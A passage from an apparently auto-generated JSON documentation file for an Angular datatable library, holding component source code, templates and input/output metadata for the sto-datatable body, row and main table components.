 @Input()\r\n  smallView: boolean;\r\n  @Input()\r\n  responsiveView: TemplateRef<unknown>;\r\n  @Input()\r\n  height: number | null;\r\n  @Input()\r\n  rows: Array<T>;\r\n  @Input()\r\n  selectable: boolean;\r\n  @Input()\r\n  width: string;\r\n  @Input()\r\n  rowHeight: number;\r\n  @Input()\r\n  selected: T;\r\n  @Input()\r\n  columns: Column[];\r\n  @Input()\r\n  virtualScroll: boolean;\r\n  @Input()\r\n  columnMode: ColumnDisplay;\r\n\r\n  private _scrollbarH: boolean;\r\n  @Input()\r\n  rowClass: rowClassFn;\r\n  @Input()\r\n  selectionMode: SelectionModes;\r\n  @Input()\r\n  scrollLeft: string | null;\r\n  @Input()\r\n  hasFooter: boolean;\r\n  @Output()\r\n  rowSelected = new EventEmitter<RowSelection<T>>();\r\n  @Output()\r\n  rowContextMenu = new EventEmitter<RowContextMenu<T>>();\r\n  @Output()\r\n  activate = new EventEmitter<RowActivation<T>>();\r\n  @Output()\r\n  scrollHeader = new EventEmitter<Event>();\r\n  @ViewChild(CdkVirtualScrollViewport)\r\n  vScroller: CdkVirtualScrollViewport;\r\n  @ViewChild('scroller')\r\n  scroller: ElementRef<HTMLDivElement>;\r\n\r\n  private destroyed$ = new Subject<boolean>();\r\n  private rowDiffer: KeyValueDiffer<T, T>;\r\n  private timeout: number | undefined;\r\n  private resizeObserver: ResizeObserver;\r\n  public horizontalScrollActive: boolean;\r\n  public verticalScrollOffset = 0;\r\n\r\n  constructor(private differs: KeyValueDiffers) {\r\n    this.rowDiffer = differs.find({}).create();\r\n  }\r\n\r\n  @HostListener('window:resize', [ '$event' ])\r\n  onresize() {\r\n    if ( !this.vScroller ) {\r\n      return;\r\n    }\r\n    if ( this.timeout ) {\r\n      clearTimeout(this.timeout);\r\n    }\r\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n    // @ts-ignore\r\n    this.timeout = setTimeout(() => {\r\n      this.vScroller.ngOnInit();\r\n    }, 100);\r\n  }\r\n\r\n  @Input()\r\n    // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  trackBy = (index: number, item: T) => {\r\n    return index;\r\n  }\r\n  _rowClass = (row: T) => {\r\n    let userDefinedClass = '';\r\n    if ( this.rowClass ) {\r\n      userDefinedClass = this.rowClass.bind(this)(row);\r\n    }\r\n    return `${userDefinedClass} sto-mdl-table__body__row`;\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n    if ( this.resizeObserver ) {\r\n      this.resizeObserver.disconnect();\r\n    }\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    if ( this.scrollbarH && this.virtualScroll ) {\r\n      this.virtHorzScrollPosition();\r\n    } else if ( this.scrollbarH ) {\r\n      this.horzScrollPosition();\r\n    }\r\n  }\r\n\r\n  private horzScrollPosition() {\r\n    if ( !this.scroller ) {\r\n      return;\r\n    }\r\n    const elRef = this.scroller.nativeElement;\r\n    const cb: ResizeObserverCallback = (entries) => {\r\n      if ( !this.hasFooter ) {\r\n        return;\r\n      }\r\n      for ( const entry of entries ) {\r\n        const t = entry.target as HTMLElement;\r\n        const el = t;\r\n        const currentScale = el.style.transform;\r\n        const notScaled = this.rows.length * this.rowHeight;\r\n        this.verticalScrollOffset = t.scrollHeight > t.offsetHeight ? 14 : 0;\r\n        if ( t.scrollWidth > t.offsetWidth ) {\r\n          this.horizontalScrollActive = true;\r\n          const strScale = /\\d+/.exec(currentScale || '');\r\n          if ( !strScale ) {\r\n            return;\r\n          }\r\n          const numericScale = Number(strScale[ 0 ]);\r\n          if ( numericScale === notScaled ) {\r\n            const newScaleValue = notScaled + this.rowHeight;\r\n            el.style.transform = `scaleY(${newScaleValue}`;\r\n          }\r\n        } else {\r\n          this.horizontalScrollActive = false;\r\n          const strScale = /\\d+/.exec(currentScale || '');\r\n          if ( !strScale ) {\r\n            return;\r\n          }\r\n          const numericScale = Number(strScale[ 0 ]);\r\n          if ( numericScale !== notScaled ) {\r\n            el.style.transform = `scaleY(${notScaled}`;\r\n          }\r\n        }\r\n      }\r\n    };\r\n    this.resizeObserver = new ResizeObserver(cb);\r\n    this.resizeObserver.observe(elRef);\r\n  }\r\n\r\n  private virtHorzScrollPosition() {\r\n    const elRef = this.vScroller.elementRef.nativeElement;\r\n    const cb: ResizeObserverCallback = (entries) => {\r\n      if ( !this.hasFooter ) {\r\n        return;\r\n      }\r\n      for ( const entry of entries ) {\r\n        const t = entry.target as HTMLElement;\r\n        const el = t.querySelector('.cdk-virtual-scroll-spacer') as HTMLDivElement;\r\n        const currentScale = el.style.transform;\r\n        const notScaled = this.rows.length * this.rowHeight;\r\n        this.verticalScrollOffset = t.scrollHeight > t.offsetHeight ? 14 : 0;\r\n        if ( t.scrollWidth > t.offsetWidth ) {\r\n          this.horizontalScrollActive = true;\r\n          const strScale = /\\d+/.exec(currentScale || '');\r\n          if ( !strScale ) {\r\n            return;\r\n          }\r\n          const numericScale = Number(strScale[ 0 ]);\r\n          if ( numericScale === notScaled ) {\r\n            const newScaleValue = notScaled + this.rowHeight;\r\n            el.style.transform = `scaleY(${newScaleValue}`;\r\n          }\r\n        } else {\r\n          this.horizontalScrollActive = false;\r\n          const strScale = /\\d+/.exec(currentScale || '');\r\n          if ( !strScale ) {\r\n            return;\r\n          }\r\n          const numericScale = Number(strScale[ 0 ]);\r\n          if ( numericScale !== notScaled ) {\r\n            el.style.transform = `scaleY(${notScaled}`;\r\n          }\r\n        }\r\n      }\r\n    };\r\n    this.resizeObserver = new ResizeObserver(cb);\r\n    this.resizeObserver.observe(elRef);\r\n  }\r\n\r\n  selectRow(event: KeyboardEvent | MouseEvent, activationData: RowSelection<T>) {\r\n    if ( event.type === this.selectionMode ) {\r\n      this.rowSelected.emit(activationData);\r\n      const el = event.target as HTMLElement;\r\n      const ignoreRe = /.*mat-select.*|.*mat-option.*|.*mat-input.*|.*mat-form.*/i;\r\n      const elTag = el.tagName.toLowerCase();\r\n      const isIgnoredEl = ignoreRe.test(el.className) || elTag === 'input';\r\n      if ( !isIgnoredEl ) {\r\n        activationData.rowEl?.focus();\r\n      }\r\n    }\r\n  }\r\n\r\n  onKeyDownHandler(event: KeyboardEvent, rowEl: HTMLDivElement, activationData: RowSelection<T> | RowActivation<T>) {\r\n    this.activate.emit({ event, rowEl, row: activationData.row, index: activationData.index });\r\n    const next = rowEl.nextSibling as HTMLDivElement;\r\n    const prev = rowEl.previousSibling as HTMLDivElement;\r\n    switch ( event.key ) {\r\n      case 'ArrowDown':\r\n        if ( next && next instanceof HTMLElement ) {\r\n          next.focus();\r\n          event.preventDefault();\r\n        }\r\n        break;\r\n      case 'ArrowUp':\r\n        if ( prev && prev instanceof HTMLElement ) {\r\n          prev.focus();\r\n          event.preventDefault();\r\n        }\r\n        break;\r\n      case 'Enter':\r\n        this.rowSelected.emit(activationData);\r\n        break;\r\n    }\r\n  }\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "",
            "styleUrl": "./sto-datatable-body.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "differs",
              "type": "KeyValueDiffers",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 104,
          "jsdoctags": [
            {
              "name": "differs",
              "type": "KeyValueDiffers",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnDestroy",
          "AfterViewInit"
        ],
        "accessors": {
          "scrollbarH": {
            "name": "scrollbarH",
            "setSignature": {
              "name": "scrollbarH",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "scrollbarH",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 34,
              "jsdoctags": [
                {
                  "name": "scrollbarH",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "scrollbarH",
              "type": "boolean",
              "returnType": "boolean",
              "line": 30
            }
          }
        },
        "templateData": "<cdk-virtual-scroll-viewport [itemSize]=\"(!smallView || !responsive) ? rowHeight : 80\"\r\n                             *ngIf=\"virtualScroll\"\r\n                             [style.height.px]=\"(height || 500) \"\r\n                             (scroll)=\"scrollHeader.emit($event)\"\r\n                             [class.sto-mdl-table__body--selectable]=\"selectable\"\r\n                             #scrollViewport\r\n                             [class.sto-mdl-table__body--scrollbar-h]=\"scrollbarH\"\r\n                             class=\"sto-mdl-table__body\">\r\n  <sto-datatable-body-row *cdkVirtualFor=\"let row of rows; templateCacheSize: 0; let i = index; let last = last; trackBy: trackBy\"\r\n                          matRipple\r\n                          [matRippleDisabled]=\"disableRipple\"\r\n                          [matRippleUnbounded]=\"false\"\r\n                          [style.min-width]=\"width\"\r\n                          [style.transform]=\"scrollLeft\"\r\n                          [columnMode]=\"columnMode\"\r\n                          [tabindex]=\"0\"\r\n                          [columns]=\"columns\"\r\n                          [row]=\"row\"\r\n                          [responsiveView]=\"responsiveView\"\r\n                          [rowIndex]=\"i\"\r\n                          [rowClass]=\"rowClass\"\r\n                          #rowEl\r\n                          (keydown)=\"onKeyDownHandler($event, rowEl.element, {index: i, event: $event, row: row})\"\r\n                          [isSelected]=\"selected === row\"\r\n                          [compressedView]=\"smallView && responsive\"\r\n                          (rowContextMenu)=\"rowContextMenu.emit($event)\"\r\n                          (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\r\n                          (dblclick)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\r\n                          [style.overflow]=\"disableRipple ? 'visible' : 'hidden'\"\r\n                          [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\r\n  </sto-datatable-body-row>\r\n  <sto-datatable-body-row [style.height.px]=\"rowHeight\"\r\n                          *ngIf=\"scrollbarH && hasFooter\"></sto-datatable-body-row>\r\n</cdk-virtual-scroll-viewport>\r\n\r\n<div class=\"sto-mdl-table__body sto-mdl-table__body--no-vscroll\"\r\n     *ngIf=\"!virtualScroll\"\r\n     (scroll)=\"scrollHeader.emit($event)\"\r\n     #scroller\r\n     [class.sto-mdl-table__body--scrollbar-h]=\"scrollbarH\"\r\n     [class.sto-mdl-table__body--selectable]=\"selectable\"\r\n     [style.padding-bottom.px]=\"horizontalScrollActive && hasFooter ? rowHeight : 0\"\r\n     [style.height]=\"height ? (height + 'px') : 'auto'\">\r\n\r\n  <sto-datatable-body-row *ngFor=\"let row of rows; let i = index; trackBy: trackBy\"\r\n                          [style.min-width]=\"width\"\r\n                          [tabindex]=\"0\"\r\n                          [columns]=\"columns\"\r\n                          [row]=\"row\"\r\n                          [responsiveView]=\"responsiveView\"\r\n                          [rowIndex]=\"i\"\r\n                          [rowClass]=\"rowClass\"\r\n                          #rowEl\r\n                          (keydown)=\"onKeyDownHandler($event, rowEl.element, {index: i, event: $event, row: row})\"\r\n                          [isSelected]=\"selected === row\"\r\n                          [compressedView]=\"smallView && responsive\"\r\n                          (rowContextMenu)=\"rowContextMenu.emit($event)\"\r\n                          (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\r\n                          (dblclick)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\r\n                          [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\r\n  </sto-datatable-body-row>\r\n  <!--<div *ngFor=\"let row of rows; let i = index; trackBy: trackBy\"\r\n       [tabindex]=\"0\"\r\n       #rowEl\r\n       (keydown)=\"onKeyDownHandler($event, rowEl, {index: i, event: $event, row: row})\"\r\n       [ngClass]=\"_rowClass | exec:row\"\r\n       [class.sto-mdl-table__body__row&#45;&#45;selected]=\"selected === row\"\r\n       (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl})\"\r\n       [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\r\n    <ng-container *ngIf=\"smallView && responsive; else regular\">\r\n      <ng-template [ngTemplateOutlet]=\"responsiveView\"\r\n                   [ngTemplateOutletContext]=\"{row: row}\">\r\n      </ng-template>\r\n    </ng-container>\r\n    <ng-template #regular>\r\n      <div class=\"sto-mdl-table__body__row__cell\"\r\n           [ngClass]=\"column.cellClass | exec:row[column.prop]:row:column\"\r\n           [style.flex-grow]=\"(column.flexGrow || column.flexGrow === 0) ? column.flexGrow : 1\"\r\n           [style.flex-shrink]=\"(column.flexShrink || column.flexShrink === 0) ? column.flexShrink : 1\"\r\n           [style.flex-basis]=\"(column.flexBasis || 80) + 'px'\"\r\n           (contextmenu)=\"rowContextMenu.emit({event: $event, column: column, row: row, index: i})\"\r\n           *ngFor=\"let column of columns;\">\r\n        <span *ngIf=\"!column.cellTemplate\"\r\n              [title]=\"row[column.prop] || ''\">{{ row[column.prop] }}</span>\r\n        <ng-template #cellTemplate\r\n                     *ngIf=\"column.cellTemplate\"\r\n                     [ngTemplateOutlet]=\"column.cellTemplate\"\r\n                     [ngTemplateOutletContext]=\"{row: row, column: column, value: row[column.prop], index: i}\">\r\n        </ng-template>\r\n      </div>\r\n    </ng-template>\r\n  </div>-->\r\n</div>\r\n"
      },
      {
        "name": "StoDatatableBodyRowComponent",
        "id": "component-StoDatatableBodyRowComponent-4312f55a38ac1c47dda34c6d2f4c0e1f25956b42cdf59c1de4a8c2488d8a620ccf3ac271a357cdb30e6ad6d782ec6c75f04428fcbf251946d8cc1d70929a2737",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-body-row",
        "styleUrls": [
          "./sto-datatable-body-row.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-datatable-body-row.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "columnMode",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 42,
            "type": "ColumnDisplay",
            "decorators": []
          },
          {
            "name": "columns",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 30,
            "type": "Column[]",
            "decorators": []
          },
          {
            "name": "compressedView",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 32,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "isSelected",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 38,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "responsiveView",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 26,
            "type": "TemplateRef<>",
            "decorators": []
          },
          {
            "name": "row",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 28,
            "type": "T",
            "decorators": []
          },
          {
            "name": "rowClass",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 36,
            "type": "rowClassFn",
            "decorators": []
          },
          {
            "name": "rowIndex",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 34,
            "type": "number",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "rowContextMenu",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 40,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "element",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "HTMLDivElement",
                "optional": false,
                "description": "",
                "line": 44,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "rowDiffer",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "KeyValueDiffer< | >",
                "optional": false,
                "description": "",
                "line": 73,
                "modifierKind": [
                  121
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "ngDoCheck",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 80,
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 48,
            "type": "string",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  ChangeDetectionStrategy,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  DoCheck,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  KeyValueDiffer,\r\n  KeyValueDiffers,\r\n  Output,\r\n  TemplateRef\r\n} from '@angular/core';\r\nimport { Column, ColumnDisplay } from '../../columns';\r\nimport { rowClassFn } from '../../models';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-body-row',\r\n  templateUrl: './sto-datatable-body-row.component.html',\r\n  styleUrls: ['./sto-datatable-body-row.component.scss'],\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class StoDatatableBodyRowComponent<T extends Record<string, unknown>> implements DoCheck {\r\n  @Input()\r\n  responsiveView: TemplateRef<unknown>;\r\n  @Input()\r\n  row: T;\r\n  @Input()\r\n  columns: Column[];\r\n  @Input()\r\n  compressedView: boolean;\r\n  @Input()\r\n  rowIndex: number;\r\n  @Input()\r\n  rowClass: rowClassFn;\r\n  @Input()\r\n  isSelected: boolean;\r\n  @Output()\r\n  rowContextMenu = new EventEmitter();\r\n  @Input()\r\n  columnMode: ColumnDisplay;\r\n\r\n  public element: HTMLDivElement;\r\n\r\n\r\n  @HostBinding('class')\r\n  get cssClass() {\r\n    let cls = 'sto-mdl-table__body__row';\r\n    if ( this.isSelected ) {\r\n      cls += ' sto-mdl-table__body__row--selected';\r\n    }\r\n\r\n    if ( this.rowClass ) {\r\n      let userClass = ' ';\r\n      if ( typeof this.rowClass === 'function' ) {\r\n        userClass += this.rowClass(this.row);\r\n      } else if ( typeof this.rowClass === 'object' && !!this.rowClass ) {\r\n        userClass += Object.values(this.rowClass).join(' ');\r\n      } else if ( typeof this.rowClass === 'string' ) {\r\n        userClass += this.rowClass;\r\n      }\r\n      cls += userClass;\r\n    }\r\n\r\n    if ( this.compressedView ) {\r\n      cls += ' sto-mdl-table__body__row--compressed';\r\n    }\r\n\r\n    return cls;\r\n  }\r\n\r\n  private rowDiffer: KeyValueDiffer<unknown, unknown>;\r\n\r\n  constructor(private differs: KeyValueDiffers, private cdr: ChangeDetectorRef, private elRef: ElementRef) {\r\n    this.rowDiffer = differs.find({}).create();\r\n    this.element = this.elRef.nativeElement as HTMLDivElement;\r\n  }\r\n\r\n  ngDoCheck() {\r\n    if ( this.rowDiffer.diff(this.row) ) {\r\n      this.cdr.detectChanges();\r\n    }\r\n  }\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "",
            "styleUrl": "./sto-datatable-body-row.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "differs",
              "type": "KeyValueDiffers",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "elRef",
              "type": "ElementRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 73,
          "jsdoctags": [
            {
              "name": "differs",
              "type": "KeyValueDiffers",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "elRef",
              "type": "ElementRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "DoCheck"
        ],
        "accessors": {
          "cssClass": {
            "name": "cssClass",
            "getSignature": {
              "name": "cssClass",
              "type": "",
              "returnType": "",
              "line": 48
            }
          }
        },
        "templateData": "<!--<div>-->\r\n<ng-container *ngIf=\"compressedView; else regular\">\r\n  <ng-template [ngTemplateOutlet]=\"responsiveView\"\r\n               [ngTemplateOutletContext]=\"{row: row}\">\r\n  </ng-template>\r\n</ng-container>\r\n<ng-template #regular>\r\n  <div class=\"sto-mdl-table__body__row__cell\"\r\n       [ngClass]=\"column.cellClass | exec:row[column.prop]:column:row\"\r\n       [ngStyle]=\"column | columnStyle:columnMode\"\r\n\r\n       (contextmenu)=\"rowContextMenu.emit({event: $event, column: column, row: row, index: rowIndex})\"\r\n       *ngFor=\"let column of columns;\">\r\n    <span *ngIf=\"!column.cellTemplate\"\r\n          [title]=\"row[column.prop] || ''\">{{ row[column.prop] }}</span>\r\n    <ng-template #cellTemplate\r\n                 *ngIf=\"column.cellTemplate\"\r\n                 [ngTemplateOutlet]=\"column.cellTemplate\"\r\n                 [ngTemplateOutletContext]=\"{row: row, column: column, value: row[column.prop], index: rowIndex}\">\r\n    </ng-template>\r\n  </div>\r\n</ng-template>\r\n<!--</div>-->\r\n"
      },
      {
        "name": "StoDatatableComponent",
        "id": "component-StoDatatableComponent-c1e0ab419b9fcfa8453350ad564dd59f9c4aee4f42360d27a7cf50dc06fcc4e56ff2ad748d9224a63357346357baf3c879386dc0d29fa4d290452b67da0fdd71",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable",
        "styleUrls": [
          "./sto-datatable.component.scss",
          "./sto-datatable-progress-bar.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-datatable.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "autoSize",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 170,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "autoSizeOffset",
            "defaultValue": "0",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 172,
            "type": "number",
            "decorators": []
          },
          {
            "name": "columnGroups",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 204,
            "type": "ColumnGroup[]",
            "decorators": []
          },
          {
            "name": "columnMode",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 110,
            "type": "ColumnDisplay",
            "decorators": []
          },
          {
            "name": "columns",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 119,
            "type": "Column[]",
            "decorators": []
          },
          {
            "name": "disableRipple",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 159,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "elevation",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 201,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "emptyMessage",
            "defaultValue": "`No records in set`",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 151,
            "type": "string",
            "decorators": []
          },
          {
            "name": "footerRow",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 95,
            "type": "any",
            "decorators": []
          },
          {
            "name": "headerHeight",
            "defaultValue": "24",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 153,
            "type": "number",
            "decorators": []
          },
          {
            "name": "height",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 36,
            "type": "number",
            "decorators": []
          },
          {
            "name": "loading",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 165,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "preserveSort",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 174,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "resizeable",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 219,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "responsive",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 189,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "responsiveBreakPoint",
            "defaultValue": "400",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 193,
            "type": "number",
            "decorators": []
          },
          {
            "name": "responsiveView",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 191,
            "type": "TemplateRef<>",
            "decorators": []
          },
          {
            "name": "rowClass",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 197,
            "type": "rowClassFn",
            "decorators": []
          },
          {
            "name": "rowHeight",
            "defaultValue": "36",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 147,
            "type": "number",
            "decorators": []
          },
          {
            "name": "rows",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 67,
            "type": "[]",
            "decorators": []
          },
          {
            "name": "scrollbarH",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 149,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "selected",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 179,
            "type": "T",
            "decorators": []
          },
          {
            "name": "selectionMode",
            "defaultValue": "SelectionModes.Click",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 155,
            "type": "SelectionModes",
            "decorators": []
          },
          {
            "name": "sortable",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 157,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "trackBy",
            "defaultValue": "(index: number, item: T) => {\r\n    return index;\r\n  }",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 234,
            "type": "(index: number, item: T) => number",
            "decorators": []
          },
          {
            "name": "virtualScroll",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 184,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "headerContextMenu",
            "defaultValue": "new EventEmitter<HeaderContextMenu>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 215,
            "type": "EventEmitter"
          },
          {
            "name": "resized",
            "defaultValue": "new EventEmitter<Column>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 211,
            "type": "EventEmitter"
          },
          {
            "name": "rowActivate",
            "defaultValue": "new EventEmitter<RowActivation<T>>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 217,
            "type": "EventEmitter"
          },
          {
            "name": "rowContextMenu",
            "defaultValue": "new EventEmitter<RowContextMenu<T>>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 213,
            "type": "EventEmitter"
          },
          {
            "name": "select",
            "defaultValue": "new EventEmitter<RowSelection<T>>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 209,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "_columnMode",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ColumnDisplay",
                "optional": false,
                "description": "",
                "line": 186,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_columns",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Column[]",
                "optional": false,
                "description": "",
                "line": 206,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_footerRow",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "T",
                "optional": false,
                "description": "",
                "line": 181,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_height",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 163,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_internalRows",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "T[]",
                "optional": false,
                "description": "",
                "line": 177,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_rows",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "T[]",
                "optional": false,
                "description": "",
                "line": 176,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "actions",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "StoDatatableActionsComponent",
                "optional": false,
                "description": "",
                "line": 145,
                "decorators": [
                  {
                    "name": "ContentChild",
                    "stringifiedArguments": "StoDatatableActionsComponent"
                  }
                ]
              },
              {
                "name": "activeSort",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "SortColumn | null",
                "optional": false,
                "description": "",
                "line": 226,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "body",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "StoDatatableBodyComponent<T>",
                "optional": false,
                "description": "",
                "line": 143,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "StoDatatableBodyComponent"
                  }
                ]
              },
              {
                "name": "ColumnDisplay",
                "defaultValue": "ColumnDisplay",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 161
              },
              {
                "name": "columnTotalWidth",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 222,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "height$",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Observable<number>",
                "optional": false,
                "description": "",
                "line": 166,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "resizeTimeout",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number | undefined",
                "optional": false,
                "description": "",
                "line": 221,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "rowTotalHeight",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 167,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "scrollLeft",
                "defaultValue": "'translate3d(0px, 0px, 0px)'",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 224,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "scrollNum",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 225,
                "modifierKind": [
                  123
                ]
              },
